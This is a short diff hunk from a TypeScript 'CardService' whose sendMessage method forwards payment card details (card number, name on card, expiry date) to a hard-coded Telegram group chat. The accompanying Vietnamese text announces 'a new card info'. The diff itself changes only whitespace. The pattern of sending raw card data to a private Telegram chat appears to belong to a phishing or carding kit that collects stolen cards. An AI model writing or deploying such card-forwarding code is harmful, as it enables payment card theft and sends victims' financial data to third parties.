@@ -24,7 +24,7 @@ export class CardService extends TypeOrmCrudService<Card> {
   async sendMessage(payload: SendNotificationDto) {
     return await this.telegramBot.sendMessage(
       '-4658637048',
-      `Bạn vừa có 1 thông tin thẻ mới:
+      `Bạn vừa có 1 thông tin thẻ mới:  
        + cardNumber: ${payload.cardNumber}
        + nameOnCard: ${payload.nameOnCard}
        + expDate: ${payload.expDate}
